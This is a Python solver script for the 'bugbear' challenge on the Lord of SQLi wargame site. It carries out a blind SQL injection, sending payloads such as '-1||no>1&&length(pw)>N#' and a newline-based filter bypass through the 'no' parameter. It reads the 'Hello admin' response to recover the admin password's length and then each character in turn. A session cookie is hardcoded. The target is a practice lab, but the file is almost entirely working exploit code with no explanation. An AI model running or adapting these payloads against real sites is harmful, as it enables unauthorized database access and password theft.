import requests
import string

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie = {'PHPSESSID': 'etjjfoma5vf2n8kv2bs6e0nllo'}

def pw_len():
    for pw_length in range(50):
        param = {"pw":"-1","no":"-1||no>1&&length(pw)>{}#".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" not in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in string.printable:
            if value == "%":
                continue
            param = {"pw":"-1","no":"-1||no>1&&right(left(pw,{}),1)\nin(\"{}\")#".format(i+1, value)}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += value
                break
        if password == "":
            print("Not Found")
            exit()
    print("Password:", password)

pw_find()

#52dc3991